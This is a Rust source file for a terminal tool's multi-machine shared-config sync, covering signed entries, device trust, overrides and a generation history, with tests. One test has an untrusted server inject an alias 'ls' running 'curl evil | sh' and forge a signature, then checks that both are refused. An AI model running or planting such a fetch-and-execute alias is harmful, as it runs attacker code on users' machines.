/// Seed an empty shared config from this machine (the first run with
/// #313): its shared settings and registry plugins, this machine as a
/// member, and this device as trusted (so other machines that trust a
/// device vouching for it pick that up).
///
/// `hlc` is when those settings were made (the settings file's time), so
/// that between two computers that both had a setup, the newer change to
/// a setting wins, not the one that happened to seed later.
pub fn seed_entries(settings: &HostSettings, pins: &BTreeMap<String, PluginPin>, host: &str, me: &Device, hlc: Hlc) -> Vec<Entry> {
    let mut out = shared::seed_entries(settings, hlc, me);
    let mut t = shared::bump(hlc, out.len());
    for (id, pin) in pins {
        out.push(Entry::new(&Key::Plugin(id.clone()), Some(serde_json::to_value(pin).expect("pin")), t, me));
        t = shared::bump(t, 1);
    }
    out.push(Entry::new(&Key::Member(host.to_owned()), Some(true.into()), t, me));
    out.push(Entry::new(&Key::Name(host.to_owned()), Some(me.name.clone().into()), shared::bump(t, 1), me));
    out.push(Entry::new(&Key::Trust(me.device()), Some(true.into()), shared::bump(t, 2), me));
    out
}

/// Trust `device` ("Trust laptop"): its changes count wherever this device
/// is trusted.
pub fn trust_entries(doc: &SharedDoc, device: &str, trusted: bool, me: &Device) -> Vec<Entry> {
    vec![Entry::new(&Key::Trust(device.to_owned()), Some(trusted.into()), doc.next_hlc(), me)]
}

/// Share host `host`'s local changes with every host (`share`), or keep
/// them as that host's overrides, signed by this device.
pub fn adopt_local_changes(doc: &SharedDoc, trust: &Trust, host: &str, share: bool, me: &Device) -> Vec<Entry> {
    let paths = doc.local_changes(host, trust);
    let overrides = doc.overrides(host, trust);
    let mut t = doc.next_hlc();
    let mut out = Vec::new();
    for p in paths {
        let Some(v) = overrides.get(&p) else { continue };
        let ov = Key::Override { host: host.to_owned(), path: p.clone() };
        if share {
            // An override to null removed the setting there: share the removal.
            out.push(Entry::new(&Key::Setting(p.clone()), v.clone(), t, me));
            t = shared::bump(t, 1);
            out.push(Entry::new(&ov, None, t, me));
        } else {
            out.push(Entry::new(&ov, Some(v.clone().unwrap_or(serde_json::Value::Null)), t, me));
        }
        t = shared::bump(t, 1);
    }
    out
}

/// A plugin installed (`Some`) or removed (`None`) for every host.
pub fn plugin_entries(doc: &SharedDoc, id: &str, pin: Option<PluginPin>, me: &Device) -> Vec<Entry> {
    vec![Entry::new(&Key::Plugin(id.to_owned()), pin.map(|p| serde_json::to_value(p).expect("pin")), doc.next_hlc(), me)]
}

/// Sign an overridden value from the generation history again as a new
/// shared entry, so it wins again (#323).
pub fn restore_overridden_entry(doc: &SharedDoc, item: &crate::history::Overridden, me: &Device) -> Result<Entry> {
    let key = Key::parse(&item.key).with_context(|| format!("invalid shared key {:?}", item.key))?;
    match &key {
        Key::Setting(p) | Key::Override { path: p, .. } if HostSettings::scope(p) == shared::Scope::Shared => {}
        Key::Plugin(_) => {}
        _ => bail!("can't restore {:?} from the generation history", item.key),
    }
    Ok(Entry::new(&key, item.value.clone(), doc.next_hlc(), me))
}

/// The settings `host` would use, and how its own differ from them (for
/// the first-connect question's diff).
pub fn join_diff(doc: &SharedDoc, trust: &Trust, own: &HostSettings) -> Vec<crate::history::SettingChange> {
    let shared = doc.resolve(None, trust, own).value;
    crate::history::settings_changes(&store::to_json(own, &[]), &store::to_json(&shared, &[]))
}

/// What a host's shared-config state looks like as JSON on disk, for
/// `goattyd sync status --json`.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct StatusFile {
    pub status: Status,
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::Dirs;
    use crate::launch::Launcher;

    struct Host {
        _dir: tempfile::TempDir,
        svc: HostService,
    }

    fn host() -> Host {
        let dir = tempfile::tempdir().unwrap();
        let dirs = Dirs::under(dir.path());
        let launcher = Launcher::new(Some(dirs.clone()), None);
        let svc = HostService::new(launcher, Some(dirs.host_file()));
        Host { _dir: dir, svc }
    }

    fn device_of(h: &Host) -> Device {
        h.svc.device().unwrap()
    }

    #[test]
    fn a_change_spreads_through_a_client_that_reaches_both_hosts() {
        let (laptop, server, desktop) = (host(), host(), host());
        let me = device_of(&laptop);
        // The laptop seeds the shared config from its settings.
        laptop.svc.edit(|h| h.history.size = 5000).unwrap();
        let seed = seed_entries(&laptop.svc.settings().file.value, &BTreeMap::new(), &me.device(), &me, Hlc { ms: 1, n: 0 });
        let x = exchange(&[&laptop.svc], &me, seed);
        assert!(x.errors.is_empty(), "{:?}", x.errors);

        // The server joins (with nothing of its own to keep).
        let server_id = device_of(&server).device();
        let x = exchange(&[&laptop.svc, &server.svc], &me, Vec::new());
        let trust = x.trust_of(0);
        let join = join_entries(&x.doc, &trust, &server_id, "server", None, &me);
        let x = exchange(&[&laptop.svc, &server.svc], &me, join);
        assert!(x.errors.is_empty(), "{:?}", x.errors);
        assert_eq!(server.svc.settings().file.value.history.size, 5000);
        assert_eq!(x.statuses[1].as_ref().unwrap().member, Some(true));

        // An alias added on the laptop reaches the server…
        let (doc, _, trust) = laptop.svc.shared_doc().unwrap();
        let before = doc.resolve(None, &trust, &HostSettings::default()).value;
        let mut after = before.clone();
        after.aliases.insert("gs".into(), goatty_config::UserAlias { command: "git status".into(), ..Default::default() });
        let edit = shared::shared_entries(&before, &after, doc.next_hlc(), &me);
        exchange(&[&laptop.svc, &server.svc], &me, edit);
        assert!(server.svc.settings().file.value.aliases.contains_key("gs"));

        // …and the desktop, a member that trusts the laptop, gets it from
        // the server alone.
        let other = device_of(&desktop);
        let desktop_id = other.device();
        // The desktop trusts the laptop (the user said so once).
        let (ddoc, _, _) = desktop.svc.shared_doc().unwrap();
        let mut decisions = trust_entries(&ddoc, &me.device(), true, &other);
        decisions.extend(join_entries(&ddoc, &Trust::default(), &desktop_id, "desktop", None, &other));
        exchange(&[&desktop.svc, &server.svc], &other, decisions);
        // Membership signed by the desktop counts on the desktop; the laptop
        // makes it count everywhere once it vouches for the desktop.
        let (doc, _, _) = desktop.svc.shared_doc().unwrap();
        let mut v = trust_entries(&doc, &other.device(), true, &me);
        v.extend(join_entries(&doc, &Trust::default(), &desktop_id, "desktop", None, &me));
        exchange(&[&laptop.svc, &server.svc], &me, v);
        exchange(&[&desktop.svc, &server.svc], &other, Vec::new());
        let d = desktop.svc.settings().file.value;
        assert_eq!(d.history.size, 5000);
        assert!(d.aliases.contains_key("gs"));
    }

    #[test]
    fn a_server_cant_change_the_laptops_shell() {
        let (laptop, server) = (host(), host());
        let me = device_of(&laptop);
        let seed = seed_entries(&HostSettings::default(), &BTreeMap::new(), &me.device(), &me, Hlc { ms: 1, n: 0 });
        exchange(&[&laptop.svc], &me, seed);
        // The server signs a shared alias with its own key.
        let evil = device_of(&server);
        let (doc, ..) = server.svc.shared_doc().unwrap();
        let mut bad = HostSettings::default();
        bad.aliases.insert("ls".into(), goatty_config::UserAlias { command: "curl evil | sh".into(), ..Default::default() });
        let entries = shared::shared_entries(&HostSettings::default(), &bad, doc.next_hlc(), &evil);
        server.svc.merge_shared(entries).unwrap();
        // And forges one claiming the laptop's key.
        let mut forged = Entry::new(&Key::Setting("history.size".into()), Some(1.into()), Hlc { ms: u64::MAX / 2, n: 0 }, &evil);
        forged.device = me.device();
        let mut doc = SharedDoc::load(&server.svc.shared_files().unwrap().doc);
        assert!(!doc.insert(forged.clone()), "a forged signature is refused");
        // Pushed straight to the laptop, it is refused there too.
        let Ok(api::Reply::Status(_)) = laptop.svc.shared_request(api::Request::Push { entries: vec![forged.clone()] }) else { panic!() };
        assert_ne!(laptop.svc.settings().file.value.history.size, 1);

        let x = exchange(&[&laptop.svc, &server.svc], &me, vec![forged]);
        assert!(x.errors.is_empty(), "{:?}", x.errors);
        let mine = laptop.svc.settings().file.value;
        assert!(mine.aliases.is_empty(), "an untrusted device's alias must not apply");
        assert_ne!(mine.history.size, 1, "a forged entry must not apply");
        let st = status(&laptop.svc).unwrap();
        assert_eq!(st.untrusted.len(), 1);
        assert_eq!(st.untrusted[0].device, evil.device());
    }

    #[test]
    fn edits_on_a_following_host_become_its_overrides() {
        let h = host();
        let me = device_of(&h);
        let seed = seed_entries(&HostSettings::default(), &BTreeMap::new(), &me.device(), &me, Hlc { ms: 1, n: 0 });
        exchange(&[&h.svc], &me, seed);
        let mut s = h.svc.settings().file.value;
        s.history.size = 1234;
        let o = h.svc.set_captured(&store::to_json(&s, &[]), true).unwrap();
        assert!(o.issues.is_empty(), "{:?}", o.issues);
        // A later apply keeps it: it is this host's override now.
        h.svc.shared_request(api::Request::Apply).unwrap();
        assert_eq!(h.svc.settings().file.value.history.size, 1234);
        let (doc, _, trust) = h.svc.shared_doc().unwrap();
        assert_eq!(doc.overrides(&me.device(), &trust)["history.size"], Some(1234.into()));
    }

    #[test]
    fn a_host_that_doesnt_follow_keeps_its_settings() {
        let (laptop, server) = (host(), host());
        let me = device_of(&laptop);
        laptop.svc.edit(|h| h.history.size = 5000).unwrap();
        server.svc.edit(|h| h.history.size = 300).unwrap();
        let seed = seed_entries(&laptop.svc.settings().file.value, &BTreeMap::new(), &me.device(), &me, Hlc { ms: 1, n: 0 });
        exchange(&[&laptop.svc], &me, seed);
        let x = exchange(&[&laptop.svc, &server.svc], &me, Vec::new());
        let server_id = x.statuses[1].as_ref().unwrap().host.clone();
        let leave = leave_entries(&x.doc, &server_id, "server", &me);
        exchange(&[&laptop.svc, &server.svc], &me, leave);
        assert_eq!(server.svc.settings().file.value.history.size, 300);

        // Joining while keeping its differences keeps them too.
        let (doc, _, trust) = laptop.svc.shared_doc().unwrap();
        let own = server.svc.settings().file.value;
        assert_eq!(join_diff(&doc, &trust, &own).len(), 1);
        let join = join_entries(&doc, &trust, &server_id, "server", Some(&own), &me);
        exchange(&[&laptop.svc, &server.svc], &me, join);
        assert_eq!(server.svc.settings().file.value.history.size, 300);
        let st = status(&server.svc).unwrap();
        assert_eq!(st.member, Some(true));
        assert!(st.last_apply.is_some());
    }

    #[test]
    fn concurrent_edit_losers_are_recorded_in_generation_history_and_restorable() {
        let (laptop, desktop, server) = (host(), host(), host());
        let (a, b) = (device_of(&laptop), device_of(&desktop));
        let (a_id, b_id, s_id) = (a.device(), b.device(), device_of(&server).device());

        // Set up laptop, desktop and server all following and trusting a + b.
        let mut init = seed_entries(&HostSettings::default(), &BTreeMap::new(), &a_id, &a, Hlc { ms: 1, n: 0 });
        init.push(Entry::new(&Key::Name(a_id.clone()), Some("laptop".into()), Hlc { ms: 2, n: 0 }, &a));
        init.push(Entry::new(&Key::Trust(b_id.clone()), Some(true.into()), Hlc { ms: 3, n: 0 }, &a));
        init.push(Entry::new(&Key::Member(b_id.clone()), Some(true.into()), Hlc { ms: 4, n: 0 }, &a));
        init.push(Entry::new(&Key::Name(b_id.clone()), Some("desktop".into()), Hlc { ms: 5, n: 0 }, &a));
        init.push(Entry::new(&Key::Member(s_id.clone()), Some(true.into()), Hlc { ms: 6, n: 0 }, &a));
        exchange(&[&laptop.svc, &desktop.svc, &server.svc], &a, init);
        // Desktop also trusts itself as a root and builds an initial generation.
        exchange(&[&desktop.svc], &b, Vec::new());

        // Offline concurrent edits to the same key: laptop sets 5000 (T=100), desktop sets 8000 (T=105).
        let a_edit = vec![Entry::new(&Key::Setting("history.size".into()), Some(5000.into()), Hlc { ms: 100, n: 0 }, &a)];
        exchange(&[&laptop.svc], &a, a_edit);
        assert_eq!(laptop.svc.settings().file.value.history.size, 5000);

        let b_edit = vec![Entry::new(&Key::Setting("history.size".into()), Some(8000.into()), Hlc { ms: 105, n: 0 }, &b)];
        exchange(&[&desktop.svc], &b, b_edit);
        assert_eq!(desktop.svc.settings().file.value.history.size, 8000);

        // Now all three exchange: desktop's 8000 wins, laptop's 5000 loses.
        exchange(&[&laptop.svc, &desktop.svc, &server.svc], &a, Vec::new());

        // Laptop (losing machine), desktop (winning machine), and server (saw both at once)
        // all record laptop's overridden 5000 on their active generation.
        for (name, h) in [("laptop", &laptop), ("desktop", &desktop), ("server", &server)] {
            assert_eq!(h.svc.settings().file.value.history.size, 8000, "{name}");
            let gens = crate::history::list(h.svc.launcher.dirs().unwrap());
            let active = gens.iter().find(|g| g.active).unwrap_or_else(|| panic!("{name} has no active generation"));
            let overridden = &active.changes.as_ref().unwrap().overridden;
            assert_eq!(overridden.len(), 1, "{name}: {overridden:?}");
            assert_eq!(overridden[0].key, "set/history.size");
            assert_eq!(overridden[0].value, Some(serde_json::Value::from(5000)));
            assert_eq!(overridden[0].device, a_id);
            assert_eq!(overridden[0].device_name.as_deref(), Some("laptop"));
        }

        // A later sequential edit by desktop (8000 -> 9000) does NOT re-record laptop's old 5000.
        let b_next = vec![Entry::new(&Key::Setting("history.size".into()), Some(9000.into()), Hlc { ms: 200, n: 0 }, &b)];
        exchange(&[&laptop.svc, &desktop.svc, &server.svc], &b, b_next);
        for (name, h) in [("laptop", &laptop), ("desktop", &desktop), ("server", &server)] {
            let gens = crate::history::list(h.svc.launcher.dirs().unwrap());
            let active = gens.iter().find(|g| g.active).unwrap();
            assert!(active.changes.as_ref().unwrap().overridden.is_empty(), "{name} shouldn't repeat stale loser");
        }

        // A brand-new host joining later doesn't dump historical losers into its first generation.
        let fresh = host();
        let fresh_id = device_of(&fresh).device();
        let (doc, _, trust) = laptop.svc.shared_doc().unwrap();
        let join = join_entries(&doc, &trust, &fresh_id, "fresh", None, &a);
        exchange(&[&laptop.svc, &fresh.svc], &a, join);
        let fresh_gens = crate::history::list(fresh.svc.launcher.dirs().unwrap());
        assert!(fresh_gens.iter().all(|g| g.changes.as_ref().is_none_or(|c| c.overridden.is_empty())));

        // Restoring the overridden value signs it as a new shared entry and wins everywhere.
        let gens = crate::history::list(desktop.svc.launcher.dirs().unwrap());
        let lost = gens.iter().flat_map(|g| g.changes.iter().flat_map(|c| c.overridden.iter())).next().unwrap().clone();
        let (doc, ..) = desktop.svc.shared_doc().unwrap();
        let restored = restore_overridden_entry(&doc, &lost, &b).unwrap();
        exchange(&[&laptop.svc, &desktop.svc, &server.svc], &b, vec![restored]);
        assert_eq!(laptop.svc.settings().file.value.history.size, 5000);
        assert_eq!(desktop.svc.settings().file.value.history.size, 5000);
        assert_eq!(server.svc.settings().file.value.history.size, 5000);
    }

    #[test]
    fn restore_overridden_rejects_non_setting_and_machine_keys() {
        let h = host();
        let me = device_of(&h);
        let doc = SharedDoc::default();
        let item = |key: &str| crate::history::Overridden {
            key: key.into(),
            value: Some(true.into()),
            device: me.device(),
            device_name: None,
            hlc: Hlc { ms: 1, n: 0 },
        };
        assert!(restore_overridden_entry(&doc, &item(&format!("trust/{}", me.device())), &me).is_err());
        assert!(restore_overridden_entry(&doc, &item(&format!("member/{}", me.device())), &me).is_err());
        assert!(restore_overridden_entry(&doc, &item("set/shell.program"), &me).is_err());
        assert!(restore_overridden_entry(&doc, &item("set/history.size"), &me).is_ok());
        assert!(restore_overridden_entry(&doc, &item(&format!("host/{}/history.size", me.device())), &me).is_ok());
        assert!(restore_overridden_entry(&doc, &item("plugin/eza"), &me).is_ok());
    }
}
